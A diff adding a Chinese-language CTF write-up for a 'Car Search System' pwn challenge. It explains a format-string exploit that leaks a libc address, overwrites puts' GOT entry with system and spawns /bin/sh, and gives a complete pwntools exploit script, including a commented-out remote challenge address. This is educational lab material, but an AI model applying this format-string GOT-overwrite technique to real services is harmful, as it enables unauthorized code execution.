@@ -231,3 +231,65 @@ pwndbg> x/20gx 0x7fffffffdd38
 0x7fffffffdd78:	0x00007fffffffde48	0x00000001f7ffcca0
 0x7fffffffdd88:	0x0000000000400bc6	0x0000000000000000
 ```
+
+
+
+
+
+### Car Search System
+
+**格式化字符串漏洞**，关键代码位置如图：
+
+![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191204235446.png)
+
+程序只有 NX 保护。利用思路： printf 处格式化漏洞泄露出 __libc_start_main+247 地址，得出 libc 基地址，将 put.got 覆写为 system ，修改 v7 值，利用 read 函数读入 /bin/sh ，调用 put 函数，触发 system('/bin/sh') 。
+
+修改 v7 值时，直接修改栈上的值，程序会down，所有可以通过指针 v8 来修改。----[pumpkin9]([https://pumpkin9.github.io/2019/11/29/i%E6%98%A5%E7%A7%8B-%E7%AC%AC%E4%B8%89%E5%AD%A3CTF%E7%AD%94%E9%A2%98%E8%B5%9Bwrite-up/](https://pumpkin9.github.io/2019/11/29/i春秋-第三季CTF答题赛write-up/))
+
+最终exp如下：
+
+```python
+# coding:utf-8
+from pwn import *
+context.terminal=['tmux','split','-h']
+context.log_level = 'debug'
+p = process("./pwn2")
+#p = remote("120.55.43.255",11001)
+elf=ELF("./pwn2")
+# 自己从本地函数库拉取
+lib = ELF("./libc.so.6")
+# 字符指针到buf偏移
+offset = 30
+
+# leak libc base addr 
+p.recvuntil("leave\n")
+p.sendline("%59$p") # 偏移59在eip开头；这里读取的是eip
+__libc_start_main = int(p.recvline().strip("\n"),16)-247
+print hex(__libc_start_main)
+libc = __libc_start_main - lib.symbols['__libc_start_main']
+log.success("libc base addr : 0x%x"%libc)
+system = libc+lib.symbols['system']
+log.success("system addr : 0x%x"%system)
+
+# overwrite put.got to system
+p.recvuntil("leave\n")
+payload = fmtstr_payload(30,{elf.got["puts"]:system})
+p.sendline(payload)
+
+# leak v7 addr
+p.recvuntil("leave\n")
+payload = "%51$p" # v7 偏移51
+p.sendline(payload)
+point = int(p.recvline().strip("\n"),16)
+log.success("v7 addr : 0x%x"%point)
+
+# overwrite v7 to 102
+p.recvuntil("leave\n")
+payload = p32(point)+"%98c%30$hhn" #偏移30以单个字节读入ascii为98单个字符
+p.sendline(payload)
+
+# get shell
+p.sendlineafter("ar in 7 day","/bin/sh\x00")
+# gdb.attach(p)
+p.interactive()
+```
